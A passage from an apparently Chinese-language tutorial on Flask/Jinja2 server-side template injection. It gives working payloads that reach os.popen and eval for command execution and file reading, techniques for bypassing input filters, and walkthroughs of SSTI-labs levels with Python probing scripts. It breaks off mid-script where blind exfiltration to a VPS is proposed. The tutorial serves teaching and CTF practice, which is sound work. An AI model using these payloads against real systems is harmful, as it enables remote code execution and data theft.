<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/ea0ef73f-7eed-446b-9e13-70ff89b57fc2.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ea0ef73f-7eed-446b-9e13-70ff89b57fc2.png"></a><br>
此时就可以去进行RCE了</p>
<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'dir'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/78971b0e-8acd-440d-817d-de3e415bf5a5.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/78971b0e-8acd-440d-817d-de3e415bf5a5.png"></a><br>
还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>
它的payload是</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('dir').read()"</span><span class="p">)}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/dcf10253-80ed-454d-8a85-72da3b87d079.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/dcf10253-80ed-454d-8a85-72da3b87d079.png"></a></p>
<h1 id="toc_ssti_3"><a href="https://tttang.com/archive/1698/#toc_ssti_3">SSTI常见绕过方式</a></h1>
<h2 id="toc__5"><a href="https://tttang.com/archive/1698/#toc__5">绕过.</a></h2>
<p>当.被ban时，有以下几种绕过方式</p>
<div class="highlight"><pre><span></span><code><span class="mi">1</span><span class="err">、</span><span class="n">用</span><span class="p">[]</span><span class="n">代替</span><span class="o">.</span><span class="err">，</span><span class="n">举个例子</span>
<span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="p">[</span><span class="s1">'__class'</span><span class="p">]}}</span>
<span class="mi">2</span><span class="err">、</span><span class="n">用attr</span><span class="p">()</span><span class="n">过滤器绕过</span><span class="err">，</span><span class="n">举个例子</span>
<span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'__class__'</span><span class="p">)}}</span>
</code></pre></div>

<h2 id="toc__"><a href="https://tttang.com/archive/1698/#toc__">绕过_</a></h2>
<p>当<code>_</code>被ban时，有以下几种绕过方式</p>
<div class="highlight"><pre><span></span><code><span class="mi">1</span><span class="err">、</span><span class="n">通过list获取字符列表</span><span class="err">，</span><span class="n">然后用pop来获取_</span><span class="err">，</span><span class="n">举个例子</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="mi">2</span><span class="err">、</span><span class="n">可以通过十六进制编码的方式进行绕过</span><span class="err">，</span><span class="n">举个例子</span>
<span class="p">{{()[</span><span class="s2">"</span><span class="se">\x5f\x5f</span><span class="s2">class</span><span class="se">\x5f\x5f</span><span class="s2">"</span><span class="p">]}}</span> <span class="o">=</span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/29b9b04c-68e6-4f05-b3d0-bb1bcae08fcb.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/29b9b04c-68e6-4f05-b3d0-bb1bcae08fcb.png"></a><br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/ae4c5801-2733-4559-8674-51ff98fb38fc.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ae4c5801-2733-4559-8674-51ff98fb38fc.png"></a></p>
<h2 id="toc__6"><a href="https://tttang.com/archive/1698/#toc__6">绕过[]</a></h2>
<p>经常有中括号被ban的情况出现，这个时候可以使用<code>__getitem__</code> 魔术方法，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/299a9c8f-5dee-4566-8e66-88fda0c87c3b.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/299a9c8f-5dee-4566-8e66-88fda0c87c3b.png"></a></p>
<h2 id="toc__7"><a href="https://tttang.com/archive/1698/#toc__7">绕过{{</a></h2>
<p>有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子<br>
我们平常使用的payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'dir'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p>修改后的payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'dir'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/0353d474-c459-40f1-9d62-b93562966072.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/0353d474-c459-40f1-9d62-b93562966072.png"></a><br>
也可以借助for循环和if语句来执行命令</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span><span class="s1">'_wrap_close'</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'dir'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/899728a5-39ec-4a4d-84e7-fc8978874e78.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/899728a5-39ec-4a4d-84e7-fc8978874e78.png"></a></p>
<h2 id="toc__8"><a href="https://tttang.com/archive/1698/#toc__8">绕过单引号和双引号</a></h2>
<p>当单引号和双引号被ban时，我们通常采用<code>request.args.a</code>，然后给a赋值这种方式来进行绕过，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">]}}</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">__builtins__</span>  <span class="n">等同于</span> <span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/33d747c3-0806-42ed-8a35-1a36a6e08b25.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/33d747c3-0806-42ed-8a35-1a36a6e08b25.png"></a></p>
<h2 id="toc_args"><a href="https://tttang.com/archive/1698/#toc_args">绕过args</a></h2>
<p>当使用args的方法绕过<code>'</code>和<code>"</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p>
<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="p">:{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">a</span><span class="p">]}}</span>
<span class="n">COOkie</span><span class="p">:</span> <span class="s2">"a"</span> <span class="p">:</span><span class="s1">'__builtins__'</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/f4592a7f-bbcb-4a4b-ae9f-fee16975d33c.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/f4592a7f-bbcb-4a4b-ae9f-fee16975d33c.png"></a></p>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/8aafea57-159d-4232-8513-08d3a4322420.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/8aafea57-159d-4232-8513-08d3a4322420.png"></a></p>
<h2 id="toc__9"><a href="https://tttang.com/archive/1698/#toc__9">绕过数字</a></h2>
<p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="p">{{(</span><span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/9d7e89ea-a96b-4d52-a0d6-56f256165654.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/9d7e89ea-a96b-4d52-a0d6-56f256165654.png"></a></p>
<h2 id="toc__10"><a href="https://tttang.com/archive/1698/#toc__10">绕过关键字</a></h2>
<p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nb">dict</span><span class="p">(</span><span class="n">__in</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">it__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">}}</span>  <span class="o">=</span><span class="fm">__init__</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/30c9d9c4-f7b1-418c-a09c-8a308b9272c8.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/30c9d9c4-f7b1-418c-a09c-8a308b9272c8.png"></a></p>
<h1 id="toc_payload"><a href="https://tttang.com/archive/1698/#toc_payload">常用payload</a></h1>
<div class="highlight"><pre><span></span><code><span class="mi">1</span><span class="err">、</span><span class="n">任意命令执行</span>
<span class="p">{</span><span class="o">%</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span><span class="s1">'_wrap_close'</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'dir'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
<span class="mi">2</span><span class="err">、</span><span class="n">任意命令执行</span>
<span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat /flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
<span class="o">//</span><span class="n">这个138对应的类是os</span><span class="o">.</span><span class="n">_wrap_close</span><span class="err">，</span><span class="n">只需要找到这个类的索引就可以利用这个payload</span>
<span class="mi">3</span><span class="err">、</span><span class="n">任意命令执行</span>
<span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('dir').read()"</span><span class="p">)}}</span>
<span class="mi">4</span><span class="err">、</span><span class="n">任意命令执行</span>
<span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
<span class="o">//</span><span class="n">x的含义是可以为任意字母</span><span class="err">，</span><span class="n">不仅仅限于x</span>
<span class="mi">5</span><span class="err">、</span><span class="n">任意命令执行</span>
<span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
<span class="mi">6</span><span class="err">、</span><span class="n">文件读取</span>
<span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
<span class="o">//</span><span class="n">x的含义是可以为任意字母</span><span class="err">，</span><span class="n">不仅仅限于x</span>
</code></pre></div>

<h1 id="toc__11"><a href="https://tttang.com/archive/1698/#toc__11">实战刷题</a></h1>
<h2 id="toc_ssti-labs"><a href="https://tttang.com/archive/1698/#toc_ssti-labs">SSTI-labs</a></h2>
<p>GitHub链接<br>
<a href="https://github.com/X3NNY/sstilabs" target="_blank">https://github.com/X3NNY/sstilabs</a></p>
<h3 id="toc_level-1"><a href="https://tttang.com/archive/1698/#toc_level-1">level 1</a></h3>
<p>这关显示未设置过滤<br>
此时就可以尝试利用的payload进行RCE<br>
常见的思路就是找类，找类的基类，找基类的子类，然后找可以RCE的模块<br>
我们这里的话，还是用<code>os._wrap_close</code>这个类，<br>
把之前的脚本改一下就可以寻找这个类了</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.134.132:5000/level/1"</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span><span class="s1">'{{().__class__.__bases__[0].__subclasses__()['</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">']}}'</span><span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="c1">#print(res.text)</span>
    <span class="k">if</span> <span class="s1">'os._wrap_close'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/2a523036-25f4-4d4d-8145-397147885da5.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/2a523036-25f4-4d4d-8145-397147885da5.png"></a><br>
因此我们这里构造payload如下</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/a8e2d4e1-0947-4cef-b6ba-66d744900879.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/a8e2d4e1-0947-4cef-b6ba-66d744900879.png"></a></p>
<p>也可以利用它的循环语句来进行获取flag</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span><span class="s1">'_wrap_close'</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>不想找类的话，这里可以偷懒一下，用<code>__builtins__</code>模块来进行RCE</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/ffc7dd18-a845-4c92-8eba-73a15c36ea1e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ffc7dd18-a845-4c92-8eba-73a15c36ea1e.png"></a><br>
利用这个模块的话，还有其他几种payload方式，罗列如下</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
</code></pre></div>

<h3 id="toc_level-2"><a href="https://tttang.com/archive/1698/#toc_level-2">level 2</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/4ba8967c-2ac8-4af3-a6b0-4032d10b8097.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/4ba8967c-2ac8-4af3-a6b0-4032d10b8097.png"></a></p>
<p>过滤了<code>{{</code><br>
这个时候可以考虑用<code>{%</code>,利用上关的思路，多加个print就可以<br>
简单修改一下脚本</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.134.132:5000/level/2"</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span><span class="s1">'{%print(().__class__.__bases__[0].__subclasses__()['</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">'])%}'</span><span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="c1">#print(res.text)</span>
        <span class="k">if</span> <span class="s1">'os._wrap_close'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/90aaa944-2f86-4702-b39d-4317f657f8cb.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/90aaa944-2f86-4702-b39d-4317f657f8cb.png"></a><br>
构造payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>或者也可以用循环语句</p>
<div class="highlight"><pre><span></span><code>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">))</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>或者那种循环语句，在level1中也提及过</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span><span class="s1">'_wrap_close'</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/eefc4e22-065d-4615-9ad0-b370f519206d.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/eefc4e22-065d-4615-9ad0-b370f519206d.png"></a></p>
<h3 id="toc_level-3"><a href="https://tttang.com/archive/1698/#toc_level-3">level 3</a></h3>
<p>题目描述<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/c8d1a0e8-2064-4672-a2bf-25fde757363e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/c8d1a0e8-2064-4672-a2bf-25fde757363e.png"></a><br>
进入环境简单测试一下，发现只回显正确与错误，如下图<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/d6d8562a-4563-41f3-a7c0-5f874b3326e5.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/d6d8562a-4563-41f3-a7c0-5f874b3326e5.png"></a><br>
这个时候就可以考虑用VPS监听来获取flag，具体payload的话，我们仍然可以用之前的姿势，将脚本简单改一下就可以，如下所示</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
